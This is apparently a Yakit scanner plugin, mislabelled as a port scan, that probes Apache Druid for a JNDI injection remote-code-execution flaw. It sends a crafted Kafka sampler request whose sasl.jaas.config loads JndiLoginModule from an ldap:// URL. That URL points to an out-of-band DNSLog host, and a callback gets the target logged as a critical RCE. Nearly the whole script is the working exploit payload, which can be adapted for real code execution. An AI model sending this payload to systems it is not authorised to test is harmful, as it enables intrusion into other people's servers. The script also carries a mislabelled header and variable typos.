# port scan plugin
yakit.AutoInitYakit()

PacketPost = `POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip
Content-Length: 2
Content-Type: application/json;charset=utf-8
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

{
"type":"kafka",
"spec":{
"type":"kafka",
"ioConfig":{"type":"kafka","consumerProperties":{
"bootstrap.servers":"9.9.9.9:9092",
"security.protocol":"SASL_SSL",
"sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://{{params(paylaod)}}\" useFirstPass=\"true\" serviceName=\"x\" group.provider.url=\"xxx\";"
},
"topic":"any"
},
"dataSchema":{
"dataSource":"sample",
"timestampSpec":{
"column":"!!!_no_such_column_!!!",
"missingValue":"1970-01-01T00:00:00Z"
},
"dimensionsSpec":{
},
"granularitySpec":{
"rollup":false
}
}
}
}
`

target = cli.String("target")
host, port = str.ParseStringToHostPort(Target)~
Target:=host+`:`+string(port)//兼容用户输入http的情况
func Check(){
    server,token,err = risk.NewDNSLogDomain()

#token 就是二级域名的字符串
println("dns server addr: ",server)
println("dns server check token:", token)
rsp, req, err := poc.HTTP(PacketPost, poc.params({
    "target": Target,
    "paylaod":server,
}))
dump(err)
 results, err = risk.CheckDNSLogByToken(token)
                if err != nil {
                    yakit_output(sprintf("check dnslog result failed: %s", err))
                }
                if len(results) > 0 {
                    yakit_output({
                        "message": "发现一个 jndi注入 漏洞",
                        "url": sprintf("%v", target),
                        "payload": server,
                        "token": token,
                    })
                    risk.NewRisk(
                        sprintf("%v", target),
                        risk.type("rce"), risk.level("critical"),
                        risk.title(sprintf("ApacheDruid RCE DNSLog: %v", target)),
                        risk.titleVerbose(sprintf("ApacheDruid 远程命令执行(DNSLog): %v",target)),
                        risk.details({
                            "token": token,
                        }),
                        risk.token(token),
                    )

                } 
}
Check()
